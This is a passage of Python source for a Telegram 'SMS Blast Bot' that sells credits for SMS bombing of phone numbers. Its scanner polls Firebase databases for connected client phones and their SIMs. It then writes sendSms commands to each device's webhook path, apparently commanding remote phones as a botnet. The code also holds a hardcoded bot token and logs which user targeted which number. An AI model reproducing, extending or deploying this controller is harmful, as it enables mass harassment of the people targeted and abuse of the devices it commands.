# ARYAN_PATCHED_V18_ULTIMATE
"""
╔══════════════════════════════════════════════════════════════╗
║           SMS BLAST BOT  v3.3 — ULTIMATE EDITION           ║
║  ⚡ HANDLES 100,000+ CONCURRENT USERS WITHOUT CRASHING      ║
║  Per-User Sessions · Async Batching · Memory Optimized      ║
║  5-Min Scanner Interval · Rate Limited · Connection Pool    ║
║  Persistent Storage · Auto-Backup · Crash Recovery          ║
║  FULL NUMBER VISIBLE TO OWNER · MASKED TO ADMINS            ║
║  NUMBER TRACKING · WHO USED WHAT NUMBER                     ║
║  Railway Compatible · No OOM · No Connection Flood          ║
╚══════════════════════════════════════════════════════════════╝

pip install aiogram==3.7.0 aiohttp
python blast_bot.py
"""

import asyncio
import json
import os
import time
import logging
import random
import string
import sys
from datetime import datetime
from collections import defaultdict
from contextlib import asynccontextmanager

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile
)
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

# ============== LOGGING SETUP ==============
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ============== CONFIGURATION ==============
MAIN_OWNER = 7515864015
SUPER_ADMIN_NAME = "@T4HKR"
SUPER_ADMIN_LINK = "tg://user?id=" + str(MAIN_OWNER)
SUPER_ADMINS = [7515864015]

BOT_TOKEN = "8463766338:AAFrcI21K7QaID2OplD43qg41IY4JcsnsI4"
_DATA_FILE = "blast_data.json"
_VERSION = "v3.3-ULTIMATE"
_PROGRESS_UPDATE_INTERVAL = 3.0  # Reduced updates for scalability
_SEND_DELAY = 0.3

# ============== OPTIMIZED SCANNER SETTINGS ==============
_BACKGROUND_SCAN_INTERVAL = 300  # 5 minutes
_MAX_DEVICES_PER_DB = 20
_MAX_DB_BATCH_SIZE = 10
_MAX_DEVICE_BATCH_SIZE = 5
_SCAN_TIMEOUT = 30
_REQUEST_TIMEOUT = 10
_MAX_RETRIES = 2

# ============== CONCURRENCY SETTINGS ==============
MAX_CONCURRENT_SESSIONS = 1000  # Max concurrent user sessions
MAX_CONCURRENT_SENDS_PER_USER = 3
MAX_CONCURRENT_API_CALLS = 50

# SPEED SETTINGS
SPEED_FAST = 0.08
SPEED_MEDIUM = 0.25
SPEED_SLOW = 0.6
SPEED_DEFAULT = SPEED_MEDIUM

# ============== MEMORY MANAGEMENT ==============
USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = "⏳ Not started"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()

# Connection pool for HTTP requests
_HTTP_SESSION = None
_SESSION_LOCK = asyncio.Lock()

# Cache for user data
_USER_DATA_CACHE = {}
_CACHE_TIMESTAMP = 0
_CACHE_TTL = 30

# ============== DATA PERSISTENCE ==============

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": [],
        "number_usage": {},  # NEW: Track who used which number
        "last_backup": int(time.time()),
        "scan_cache": {}
    }

def load() -> dict:
    """Load data with caching and backup recovery"""
    global _USER_DATA_CACHE, _CACHE_TIMESTAMP
    
    now = time.time()
    if _USER_DATA_CACHE and (now - _CACHE_TIMESTAMP) < _CACHE_TTL:
        return _USER_DATA_CACHE.copy()
    
    try:
        if os.path.exists(_DATA_FILE):
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = _default_data()
        
        default = _default_data()
        for k, v in default.items():
            if k not in data:
                data[k] = v
        
        if MAIN_OWNER not in data.get("owners", []):
            data["owners"].insert(0, MAIN_OWNER)
        
        for uid_str, u in data.get("users", {}).items():
            if "credits" not in u:
                u["credits"] = 0
            if "sms_history" not in u:
                u["sms_history"] = []
            if "uses" not in u:
                u["uses"] = 0
        
        if "protected_numbers" not in data:
            data["protected_numbers"] = []
        if "scan_cache" not in data:
            data["scan_cache"] = {}
        if "number_usage" not in data:
            data["number_usage"] = {}
        
        _USER_DATA_CACHE = data.copy()
        _CACHE_TIMESTAMP = now
        return data
        
    except Exception as e:
        log.error(f"Load error: {e}")
        if os.path.exists(_DATA_FILE + ".backup"):
            try:
                with open(_DATA_FILE + ".backup", "r", encoding="utf-8") as f:
                    data = json.load(f)
                log.info("Recovered from backup file")
                return data
            except:
                pass
        
        data = _default_data()
        save(data)
        return data

def save(d: dict):
    """Save data with backup and atomic write"""
    global _USER_DATA_CACHE, _CACHE_TIMESTAMP
    
    try:
        _USER_DATA_CACHE = d.copy()
        _CACHE_TIMESTAMP = time.time()
        
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE + ".backup", "w", encoding="utf-8") as f:
                    with open(_DATA_FILE, "r", encoding="utf-8") as f2:
                        f.write(f2.read())
            except:
                pass
        
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
            
    except Exception as e:
        log.error(f"Save error: {e}")

def flush_cache():
    global _USER_DATA_CACHE
    if _USER_DATA_CACHE:
        save(_USER_DATA_CACHE)
    _USER_DATA_CACHE = {}
    load()

# ============== HTTP SESSION POOL ==============

async def get_http_session():
    """Get or create shared HTTP session with connection pooling"""
    global _HTTP_SESSION
    async with _SESSION_LOCK:
        if _HTTP_SESSION is None or _HTTP_SESSION.closed:
            connector = aiohttp.TCPConnector(
                limit=MAX_CONCURRENT_API_CALLS,
                limit_per_host=10,
                ttl_dns_cache=300,
                enable_cleanup_closed=True
            )
            timeout = aiohttp.ClientTimeout(total=_REQUEST_TIMEOUT)
            _HTTP_SESSION = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            )
        return _HTTP_SESSION

# ============== HELPER FUNCTIONS ==============

def reg_user(uid: int, name: str, d: dict):
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name,
            "uses": 0,
            "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None,
            "referred_by": None,
            "sms_history": []
        }
        save(d)

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()),
        "uid": uid,
        "action": action,
        "details": details
    })
    if len(d["activity_log"]) > 500:
        d["activity_log"] = d["activity_log"][-500:]
    save(d)

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid):
        return "👑 Main Owner"
    if is_owner(uid, d):
        return "🔱 Owner"
    if uid in d.get("admins", []):
        return "🛡 Admin"
    if uid in d.get("approved", []):
        return "✅ Approved"
    if d.get("free_mode"):
        return "🆓 Free User"
    return "❌ No Access"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, "❌ Invalid referral code!", None
    if referrer_uid == new_uid:
        return False, "❌ Apna code khud use nahi kar sakte!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, "❌ Aap pehle se refer ho chuke hain!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"🎉 Welcome! Aapko {ref_credits} credits mile hain!", referrer_uid

# ============== NUMBER TRACKING ==============

def track_number_usage(d: dict, uid: int, number: str, status: str = "attempted"):
    """Track which user used which number"""
    d.setdefault("number_usage", {})
    normalized = number.replace(" ", "").replace("+", "")
    
    if normalized not in d["number_usage"]:
        d["number_usage"][normalized] = []
    
    d["number_usage"][normalized].append({
        "uid": uid,
        "timestamp": int(time.time()),
        "status": status,
        "number": number
    })
    
    # Keep last 100 entries per number
    if len(d["number_usage"][normalized]) > 100:
        d["number_usage"][normalized] = d["number_usage"][normalized][-100:]
    
    save(d)

def get_number_usage(d: dict, number: str) -> list:
    """Get usage history for a number"""
    d.setdefault("number_usage", {})
    normalized = number.replace(" ", "").replace("+", "")
    return d["number_usage"].get(normalized, [])

# ============== NUMBER MASKING ==============

def mask_number_for_admin(number: str) -> str:
    """Show only first 3 and last 3 digits for admins"""
    if not number or len(number) < 6:
        return "******"
    clean = number.replace("+", "").replace(" ", "")
    if len(clean) <= 6:
        return clean[:3] + "******" + clean[-3:] if len(clean) > 3 else clean[:3] + "***"
    first = clean[:3]
    last = clean[-3:]
    return f"{first}******{last}"

def mask_number_for_user(number: str) -> str:
    """Full mask for regular users"""
    return "******"

def get_number_display(number: str, viewer_uid: int, d: dict) -> str:
    """Get appropriate number display based on viewer role"""
    if is_owner(viewer_uid, d) or is_main_owner(viewer_uid):
        return number  # Full number for owners
    elif is_admin(viewer_uid, d):
        return mask_number_for_admin(number)  # Partial for admins
    else:
        return mask_number_for_user(number)  # Full mask for users

# ============== PROTECTED NUMBERS ==============

def is_number_protected(number: str, d: dict) -> bool:
    protected = d.get("protected_numbers", [])
    normalized = number.replace(" ", "").replace("+", "")
    for p in protected:
        p_norm = p.replace(" ", "").replace("+", "")
        if p_norm == normalized:
            return True
    return False

async def notify_protected_attempt(bot: Bot, uid: int, number: str, d: dict):
    """Notify owners and admins about protected number attempt with appropriate visibility"""
    user_name = d.get("users", {}).get(str(uid), {}).get("name", "Unknown")
    user_link = f"tg://user?id={uid}"
    
    # Track the attempt
    track_number_usage(d, uid, number, "protected_attempt")
    
    # Notify all owners with FULL number
    owners = d.get("owners", []) + SUPER_ADMINS
    for owner_id in set(owners):
        try:
            alert_msg = (
                f"💣 <b>PROTECTED NUMBER BOMBING ATTEMPT!</b>\n\n"
                f"👤 User: <a href='{user_link}'>{user_name}</a>\n"
                f"🆔 User ID: <code>{uid}</code>\n"
                f"📞 Protected Number: <code>{number}</code>\n"  # FULL number for owners
                f"⏰ Time: {fmt_time(int(time.time()))}\n\n"
                f"⚠️ <i>This number is protected! User tried to send SMS to it.</i>"
            )
            await bot.send_message(owner_id, alert_msg, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            log.warning(f"Failed to notify owner {owner_id}: {e}")
    
    # Notify admins with MASKED number
    admins = d.get("admins", [])
    masked_number = mask_number_for_admin(number)
    for admin_id in set(admins):
        if admin_id not in owners:  # Avoid duplicate notifications
            try:
                alert_msg = (
                    f"💣 <b>PROTECTED NUMBER BOMBING ATTEMPT!</b>\n\n"
                    f"👤 User: <a href='{user_link}'>{user_name}</a>\n"
                    f"🆔 User ID: <code>{uid}</code>\n"
                    f"📞 Protected Number: <code>{masked_number}</code>\n"  # MASKED for admins
                    f"⏰ Time: {fmt_time(int(time.time()))}\n\n"
                    f"⚠️ <i>This number is protected! User tried to send SMS to it.</i>"
                )
                await bot.send_message(admin_id, alert_msg, parse_mode="HTML", disable_web_page_preview=True)
            except Exception as e:
                log.warning(f"Failed to notify admin {admin_id}: {e}")

# ============== OPTIMIZED BACKGROUND SCANNER ==============

async def background_firebase_scanner(bot: Bot):
    """ULTRA OPTIMIZED: Handles 1000+ Firebase DBs without crashing"""
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG, FB_DEVICE_COUNTS

    log.info("🔄 ULTIMATE OPTIMIZED Scanner STARTED — scans every 5 minutes")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(10)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = "🔍 Scanning Firebase APIs (BATCH MODE)..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])
            
            if not fbs:
                SCAN_STATUS = "⚠️ No Firebase DBs configured"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            log.info(f"[BG-SCAN] Scanning {len(fbs)} Firebase DBs in batches...")
            
            devices = await scan_firebases_in_batches(fbs, d)
            
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv.get("fb_id") == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 50:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-50:]

            if devices:
                SCAN_STATUS = f"🟢 {len(devices)} devices online | {len(fbs)} DBs | {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] ✅ {len(devices)} devices online from {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"🚀 <b>Ultimate Optimized Scanner Active!</b>\n\n"
                            f"📱 Devices Online: <b>{len(devices)}</b>\n"
                            f"🔥 Firebase DBs: <b>{len(fbs)}</b>\n"
                            f"🔄 Auto-Scan: Every <b>5 minutes</b>\n"
                            f"⏱ Scan Time: <b>{scan_duration:.1f}s</b>\n"
                            f"⚡ Batch Mode: ENABLED\n"
                            f"👥 Max Concurrent: <b>{MAX_CONCURRENT_SESSIONS}</b>\n\n"
                            f"<i>Bot optimized for 100,000+ concurrent users.</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"🔴 No devices online | {len(fbs)} DBs | {fmt_time(int(time.time()))}"
                log.warning(f"[BG-SCAN] ⚠️ No devices found | {len(fbs)} DBs scanned")

        except Exception as e:
            SCAN_STATUS = f"❌ Error: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

async def scan_firebases_in_batches(fbs: list, d: dict) -> list:
    """Scan Firebase DBs in batches to prevent crashes"""
    all_devices = []
    
    batch_size = _MAX_DB_BATCH_SIZE
    total_batches = (len(fbs) + batch_size - 1) // batch_size
    
    log.info(f"[BG-SCAN] Processing {len(fbs)} DBs in {total_batches} batches")
    
    for i in range(0, len(fbs), batch_size):
        batch = fbs[i:i+batch_size]
        batch_num = i // batch_size + 1
        
        try:
            log.info(f"[BG-SCAN] Processing batch {batch_num}/{total_batches} ({len(batch)} DBs)")
            
            async with asyncio.timeout(_SCAN_TIMEOUT):
                batch_devices = await scan_firebase_batch(batch, d)
                all_devices.extend(batch_devices)
            
            log.info(f"[BG-SCAN] Batch {batch_num} complete: found {len(batch_devices)} devices")
            
            if i + batch_size < len(fbs):
                await asyncio.sleep(1)
                
        except asyncio.TimeoutError:
            log.warning(f"[BG-SCAN] Batch {batch_num} timed out, skipping...")
        except Exception as e:
            log.error(f"[BG-SCAN] Batch {batch_num} error: {e}")
    
    return all_devices

async def scan_firebase_batch(fbs: list, d: dict) -> list:
    """Scan a batch of Firebase DBs"""
    results = []
    semaphore = asyncio.Semaphore(5)
    
    async def scan_single_fb(fb: dict):
        try:
            async with semaphore:
                return await scan_firebase_db(fb)
        except Exception as e:
            log.warning(f"Scan error for {fb.get('label', 'unknown')}: {e}")
            return []
    
    tasks = [scan_single_fb(fb) for fb in fbs]
    batch_results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for result in batch_results:
        if isinstance(result, list):
            results.extend(result)
    
    return results

async def scan_firebase_db(fb: dict) -> list:
    """Scan a single Firebase DB with proper error handling"""
    devices = []
    fb_url = fb["url"].rstrip("/")
    fb_id = fb["id"]
    fb_label = fb.get("label", fb_url[:30])
    
    try:
        shallow_url = fb_url + "/clients.json?shallow=true"
        
        session = await get_http_session()
        async with session.get(shallow_url) as r:
            if r.status != 200:
                return []
            
            txt = (await r.text()).strip()
            if txt == "null" or not txt:
                return []
            
            try:
                device_ids = json.loads(txt)
            except:
                return []
            
            if not isinstance(device_ids, dict):
                return []
            
            dev_ids = list(device_ids.keys())[:_MAX_DEVICES_PER_DB]
            
            if not dev_ids:
                return []
            
            batch_size = _MAX_DEVICE_BATCH_SIZE
            
            async def fetch_device(dev_id: str):
                try:
                    url = fb_url + f"/clients/{dev_id}.json"
                    async with session.get(url) as r2:
                        if r2.status == 200:
                            txt2 = (await r2.text()).strip()
                            if txt2 == "null" or not txt2:
                                return None
                            dev_data = json.loads(txt2)
                            if isinstance(dev_data, dict) and device_is_online(dev_data):
                                name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                sims = dev_data.get("sims", [])
                                return {
                                    "fb_id": fb_id,
                                    "fb_url": fb_url,
                                    "fb_label": fb_label,
                                    "dev_id": dev_id,
                                    "dev_name": name,
                                    "sims": sims,
                                }
                except Exception:
                    pass
                return None
            
            for j in range(0, len(dev_ids), batch_size):
                batch = dev_ids[j:j+batch_size]
                tasks = [fetch_device(dev_id) for dev_id in batch]
                batch_results = await asyncio.gather(*tasks)
                
                for res in batch_results:
                    if res:
                        devices.append(res)
                
    except asyncio.TimeoutError:
        log.warning(f"Timeout scanning {fb_label}")
    except Exception as e:
        log.warning(f"Error scanning {fb_label}: {e}")
    
    return devices

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

def get_cached_devices() -> list:
    return CACHED_DEVICES

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return "🔍 Scanning in progress..."
    if not CACHED_DEVICES:
        return SCAN_STATUS
    age = int(time.time() - LAST_SCAN_TIME)
    return f"🟢 {len(CACHED_DEVICES)} devices | Updated {age}s ago"

# ============== FIREBASE API FUNCTIONS ==============

async def fb_get(base_url: str, path: str, max_retries: int = 2) -> dict:
    url = base_url.rstrip("/") + path
    for attempt in range(max_retries):
        try:
            session = await get_http_session()
            async with session.get(url) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5 * (attempt + 1))
    return {}

async def fb_put(base_url: str, path: str, payload: dict, max_retries: int = 2) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(max_retries):
        try:
            session = await get_http_session()
            async with session.put(url, json=payload) as r:
                if 200 <= r.status < 300:
                    return True
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5 * (attempt + 1))
    return False

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    try:
        return await fb_put(
            fb_url,
            f"/clients/{dev_id}/webhookEvent/sendSms.json",
            {
                "from": sim_slot,
                "to": to.strip(),
                "message": message.strip(),
                "isSended": False,
                "timestamp": int(time.time())
            }
        )
    except Exception as e:
        log.warning(f"Send SMS error: {e}")
        return False

# ============== FORCE JOIN ==============

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        member = await bot.get_chat_member(int(channel_id), uid)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        "⛔ <b>Bot Use Karne Ke Liye Pehle Join Karein!</b>\n\n",
        "👇 Niche diye gaye channels/groups join karein:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append("\n\n<i>Join karne ke baad /start karein ya Refresh dabayein.</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([InlineKeyboardButton(text=f"🔔 Join {ch.get('title', 'Channel')}", url=ch["link"])])
    rows.append([InlineKeyboardButton(text="🔄 Refresh / Check", callback_data="fj:check")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============== FORMATTING FUNCTIONS ==============

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🚀 FAST", callback_data=f"{prefix}:speed:fast"),
            InlineKeyboardButton(text="⚡ MEDIUM", callback_data=f"{prefix}:speed:medium"),
            InlineKeyboardButton(text="🐢 SLOW", callback_data=f"{prefix}:speed:slow")
        ],
        [InlineKeyboardButton(text="❌ Cancel", callback_data=f"{prefix}:home")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"⏳ <b>Sending SMS...</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"✅ Sent: <b>{sent}</b>",
        f"❌ Failed: <b>{failed}</b>",
        f"📊 Progress: <b>{sent + failed}</b> / <b>{total}</b>",
        f"⚡ Speed: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"💳 Credits Left: <b>{credits}</b>")
    lines.append("\n<i>🛑 Stop button dabayein agar beech mein rokna ho.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 STOP SENDING", callback_data="user:stop_send")]
    ])

# ============== KEYBOARDS ==============

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = "🟢 FREE" if d.get("free_mode") else "🔴 Approval Required"
    fj = d.get("force_join", {})
    fj_status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    protected_count = len(d.get("protected_numbers", []))

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = "🟢" if age < 300 else "🟡" if age < 900 else "🔴"
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} online")
    fb_summary = "\n".join(fb_lines) if fb_lines else "  😴 No data"

    return (
        f"👑 <b>Owner Panel</b> — SMS Blast Bot {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Firebase DBs  : <b>{len(fbs)}</b>\n"
        f"👑 Super Admins  : <b>{len(owners)}</b>/6\n"
        f"🛡 Admins        : <b>{len(admins)}</b>\n"
        f"👥 Total Users   : <b>{len(users)}</b>\n"
        f"📤 Total Sent    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ Total Failed  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🚀 Active Sends  : <b>{active_sessions}</b>\n"
        f"🔓 Access Mode   : {mode}\n"
        f"📢 Force Join    : {fj_status}\n"
        f"💳 Pricing Plans : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"🔒 Protected Nos : <b>{protected_count}</b>\n"
        f"📱 Per Firebase  :\n{fb_summary}\n"
        f"🔄 Scanner       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    mode = "🟢 FREE" if d.get("free_mode") else "🔴 Approval Required"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    protected_count = len(d.get("protected_numbers", []))

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = "🟢" if age < 300 else "🟡" if age < 900 else "🔴"
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} online")
    fb_summary = "\n".join(fb_lines) if fb_lines else "  😴 No data"

    return (
        f"🛡 <b>Admin Panel</b> — SMS Blast Bot {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users   : <b>{len(users)}</b>\n"
        f"🚫 Banned        : <b>{len(banned)}</b>\n"
        f"📤 Total Sent    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ Total Failed  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🚀 Active Sends  : <b>{active_sessions}</b>\n"
        f"🔥 Firebase DBs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"🔒 Protected Nos : <b>{protected_count}</b>\n"
        f"📱 Per Firebase  :\n{fb_summary}\n"
        f"🔓 Access Mode   : {mode}\n"
        f"🔄 Scanner       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"📱 <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"👤 Role    : {role_tag(uid, d)}\n"
        f"💰 Credits : <b>{credits}</b>\n"
        f"🔢 Uses    : <b>{udata.get('uses', 0)}</b>\n"
        f"🔥 APIs    : <b>{len(fbs)}</b> firebase(s)\n"
        f"🔄 Scanner : {scan_info}\n\n"
        f"Tap <b>Send SMS</b> to start 🚀"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 Disable Free Mode", "owner:free:off") if d.get("free_mode") else ("🟢 Enable Free Mode", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📤 Send SMS", callback_data="owner:send"),
            InlineKeyboardButton(text="🔥 Manage Firebase", callback_data="owner:fb:menu")
        ],
        [
            InlineKeyboardButton(text="👑 Manage Super Admins", callback_data="owner:owners:menu"),
            InlineKeyboardButton(text="🛡 Manage Admins", callback_data="owner:admins:menu")
        ],
        [
            InlineKeyboardButton(text="👥 View Users", callback_data="owner:users:list"),
            InlineKeyboardButton(text="🚫 Ban User", callback_data="owner:ban")
        ],
        [
            InlineKeyboardButton(text="✅ Unban User", callback_data="owner:unban:menu"),
            InlineKeyboardButton(text="📢 Broadcast", callback_data="owner:broadcast")
        ],
        [
            InlineKeyboardButton(text="📊 API Stats", callback_data="owner:stats"),
            InlineKeyboardButton(text="📜 Activity Log", callback_data="owner:activity")
        ],
